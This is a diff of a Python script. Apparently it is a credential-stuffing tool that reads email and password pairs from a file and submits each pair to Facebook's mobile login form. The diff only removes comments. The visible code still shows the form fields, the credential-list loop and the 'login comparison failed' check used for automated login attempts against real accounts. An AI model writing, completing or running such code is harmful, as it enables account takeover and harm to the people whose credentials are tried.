@@ -4,7 +4,7 @@ try:
     url_string = {
         "facebook":"https://m.facebook.com/login/?ref=dbl&fl"
     }
-    """ help """
+
     def help():    
         print("""
         <<< help >>>
@@ -23,7 +23,6 @@ try:
          'email': 'you id@email', 'pass': 'you pw', 'form': 'login'}
         """)
     a = ""
-    """ attempt() Select"""
     attempt_code = "[*] Login comparison failed"
     def attempt(url , userid, password):
         data = {
@@ -86,12 +85,11 @@ try:
 
 
 
-    """ file_name() Select"""
     try:
         def file_name(url,filename):
             try:
                 f= open(filename,"r")
-                attempt_code = "[*] Login comparison failed" #reset
+                attempt_code = "[*] Login comparison failed"
                 try:
                     while True:
                         lien = f.readline()
@@ -104,7 +102,6 @@ try:
                     i_d = id_password[0]
                     password = id_password[1]
                     f.close()
-                    #facebook login form data
                     data = {
                             'lsd': 'lsd',
                             'charset_test': 'csettest',
@@ -116,7 +113,6 @@ try:
                             'm_ts': 'mts',
                             'li': 'li',
                             }
-                    # facebook.com login
                     data['email'] = i_d.strip("\n")
                     data['pass'] = password
                     data['form'] = 'login'
@@ -142,7 +138,7 @@ try:
         def file_namedata(url,filename,code_data):
             try:
                 f= open(filename,"r")
-                attempt_code = "[*] Login comparison failed" #reset
+                attempt_code = "[*] Login comparison failed"
                 try:
                     while True:
                         lien = f.readline()
@@ -155,7 +151,6 @@ try:
                     i_d = id_password[0]
                     password = id_password[1]
                     f.close()
-                    #facebook login form data
                     data = {
                             'lsd': 'lsd',
                             'charset_test': 'csettest',
@@ -167,7 +162,6 @@ try:
                             'm_ts': 'mts',
                             'li': 'li',
                             }
-                    # facebook.com login
                     data['email'] = i_d.strip("\n")
                     data['pass'] = password
                     data['form'] = 'login'
